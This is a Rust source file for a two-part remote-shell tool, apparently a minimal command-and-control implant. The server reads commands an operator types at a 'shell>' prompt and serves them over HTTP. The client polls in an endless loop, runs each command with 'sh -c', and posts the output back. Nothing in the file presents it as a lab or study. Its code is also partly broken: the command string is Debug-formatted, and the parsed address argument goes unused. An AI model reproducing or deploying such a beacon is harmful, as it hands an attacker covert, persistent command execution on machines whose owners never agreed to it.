#[macro_use]
extern crate clap;
extern crate hyper;
extern crate futures;
extern crate curl;
extern crate pretty_env_logger;
#[macro_use]
extern crate log;
extern crate tokio_core;
extern crate reqwest;

use std::time::Duration;
use std::thread::sleep;
use std::process::Command;
use std::io;
use std::io::Read;
use clap::App;
use hyper::server::{Http, Request, Response, Service};
use hyper::{Method, StatusCode};
use futures::future::Future;
use curl::easy::Easy;

struct OceanService;

fn main() {
    pretty_env_logger::init();
    info!("0cean logs");
    let yaml = load_yaml!("cli.yml");
    let _matches = App::from_yaml(yaml)
        .author(crate_authors!())
        .version(crate_version!())
        .get_matches();
    if let Some(_matches) = _matches.subcommand_matches("server") {
        if let Some(port) = _matches.value_of("port") {
          println!("A port was passed: {}", port);
        }
        let _result = server();
    } else if let Some(_matches) = _matches.subcommand_matches("client") {
        if let Some(address) = _matches.value_of("address") {
          println!("Address was passed: {}", address);
        }
        client();
    }
}

fn client() {
    let mut handle = Easy::new();
    loop {
        info!("Loop forever!");
        handle.url("http://127.0.0.1:3000").unwrap();
        handle.get(true).unwrap();
        handle.perform().unwrap();

        let text = reqwest::get("http://127.0.0.1:3000").unwrap()
            .text();
        let cmd = format!("{:?}", text);
        let output = Command::new("sh")
           .arg("-c")
           .arg(cmd)
           .output()
           .expect("Failed to execute process");
        let output = format!("stdout: {}", String::from_utf8_lossy(&output.stdout));
        println!("{}", output);
        let mut data = output.as_bytes();
        handle.post(true).unwrap();
        handle.post_field_size(data.len() as u64).unwrap();
        let mut transfer = handle.transfer();
        transfer.read_function(|buf| {
            Ok(data.read(buf).unwrap_or(0))
        }).unwrap();
        transfer.perform().unwrap();
        sleep(Duration::from_millis(1000));
    }
}

fn server() -> Result<(), hyper::Error> {
    let port = 3000;
    let addr = ([127, 0, 0, 1], port).into();

    let server = Http::new().bind(&addr, || Ok(OceanService)).unwrap();
    println!("Listening on http://{}", addr);
    server.run()
}

impl Service for OceanService {
    type Request = Request;
    type Response = Response;
    type Error = hyper::Error;
    // The future representing the eventual Response your call will
    // resolve to. This can change to whatever Future you need.
    type Future = Box<Future<Item=Self::Response, Error=Self::Error>>;

    fn call(&self, req: Request) -> Self::Future {
        let mut response = Response::new();

        match (req.method(), req.path()) {
          (&Method::Get, "/") => {
              println!("{}", "shell>");
              let stdin = io::stdin();
              let input = &mut String::new();
              let _result = stdin.read_line(input);
              let body = format!("{}", input);
              response.set_body(body);
          },
          (&Method::Post, "/") => {
              // we'll be back
              println!("{}", "OK");
              response.set_body("Thx for the fish!");
          },
          _ => {
              response.set_status(StatusCode::NotFound);
          },
        };

        Box::new(futures::future::ok(response))
    }
}
